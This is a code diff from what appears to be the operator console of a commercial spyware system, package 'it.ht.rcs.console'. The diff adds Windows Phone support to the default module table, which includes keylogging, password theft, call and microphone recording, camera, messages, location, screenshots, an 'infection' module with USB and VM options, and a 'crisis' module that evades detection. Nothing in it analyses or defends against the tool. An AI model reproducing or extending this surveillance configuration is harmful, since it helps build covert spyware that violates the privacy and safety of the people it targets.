@@ -44,49 +44,49 @@ package it.ht.rcs.console
 
 				{module: "application", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
 
-				{module: "calendar", _type: "desktop,mobile", _platform: "osx,ios,blackberry,winmo,symbian,android,linux"},
+				{module: "calendar", _type: "desktop,mobile", _platform: "osx,ios,blackberry,winmo,symbian,android,linux,winphone"},
 
 				{module: "call", buffer: 512000, compression: 5,
 
-					record: true, _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
+					record: true, _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux,winphone"},
 
-				{module: "camera", quality: "med", _type: "desktop,mobile", _platform: "windows,osx,ios,winmo,symbian,linux"},
+				{module: "camera", quality: "med", _type: "desktop,mobile", _platform: "windows,osx,ios,winmo,symbian,linux,winphone"},
 
-				{module: "chat", _type: "desktop,mobile", _platform: "windows,osx,blackberry,linux,ios,android"},
+				{module: "chat", _type: "desktop,mobile", _platform: "windows,osx,blackberry,linux,ios,android,winphone"},
 
-				{module: "clipboard", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,android,linux"},
+				{module: "clipboard", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,android,linux,winphone"},
 
 				{module: "conference", number: "", _type: "mobile", _platform: "winmo"},
 
 				{module: "crisis", network: {enabled: false, processes: []}, hook: {enabled: true, processes: []},
 
-					mic: true, call: true, camera: true, position: true, synchronize: false, _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,android,symbian,linux"},
+					mic: true, call: true, camera: true, position: true, synchronize: false, _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,android,symbian,linux,winphone"},
 
-				{module: "device", list: false, _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
+				{module: "device", list: false, _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux,winphone"},
 
 				{module: "file", open: false, capture: false, minsize: 1, maxsize: 500000, date: formatter.format(today), accept: [], deny: [], _type: "desktop", _platform: "windows,osx,linux"},
 
 				{module: "infection", local: false, mobile: false, usb: false, vm: 0, factory: "", _type: "desktop", _platform: "windows,linux"},
 
-				{module: "keylog", _type: "desktop,mobile", _platform: "windows,osx,ios,linux"},
+				{module: "keylog", _type: "desktop,mobile", _platform: "windows,osx,ios,linux,winphone"},
 
 				{module: "livemic", number: "", _type: "mobile", _platform: "winmo"},
 
-				{module: "messages", mail: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE, maxsize: 100000}}, sms: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}}, mms: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}}, _type: "desktop,mobile", _platform: "windows,ios,blackberry,symbian,android,linux"},
+				{module: "messages", mail: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE, maxsize: 100000}}, sms: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}}, mms: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}}, _type: "desktop,mobile", _platform: "windows,ios,blackberry,symbian,android,linux,winphone"},
 
-				{module: "mic", threshold: 0.22, silence: 5, autosense: false, _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
+				{module: "mic", threshold: 0.22, silence: 5, autosense: false, _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux,winphone"},
 
 				{module: "mouse", width: 50, height: 50, _type: "desktop", _platform: "windows,osx,linux"},
 
-				{module: "password", _type: "desktop,mobile", _platform: "windows,symbian,linux"},
+				{module: "password", _type: "desktop,mobile", _platform: "windows,symbian,linux,winphone"},
 
-				{module: "position", gps: false, cell: true, wifi: true, _type: "desktop,mobile", _platform: "windows,osx,blackberry,winmo,symbian,android,ios,linux"},
+				{module: "position", gps: false, cell: true, wifi: true, _type: "desktop,mobile", _platform: "windows,osx,blackberry,winmo,symbian,android,ios,linux,winphone"},
 
 				//{module: "print", quality: "med", _type: "desktop", _platform: "windows,linux"},
 
-				{module: "screenshot", onlywindow: false, quality: "med", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
+				{module: "screenshot", onlywindow: false, quality: "med", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux,winphone"},
 
-				{module: "url", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,linux"}];
+				{module: "url", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,linux,winphone"}];
 
 			if (skipFilter)
 				return modules;
